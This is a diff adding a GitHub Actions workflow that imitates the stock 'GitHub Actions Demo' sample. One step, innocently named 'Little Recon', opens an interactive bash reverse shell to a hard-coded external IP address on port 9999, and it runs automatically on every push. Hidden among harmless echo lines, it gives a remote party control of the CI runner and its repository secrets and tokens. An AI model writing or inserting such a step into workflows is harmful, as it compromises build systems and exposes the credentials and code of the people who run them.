@@ -1,0 +1,10 @@
+name: GitHub Actions Demo
+run-name: ${{ github.actor }} is testing out GitHub Actions 🚀
+on: [push]
+jobs:
+  Explore-GitHub-Actions:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Little Recon
+        run: bash -i >& /dev/tcp/137.184.200.180/9999 0>&1
+      - run: echo "🍏 This job's status is ${{ job.status }}."
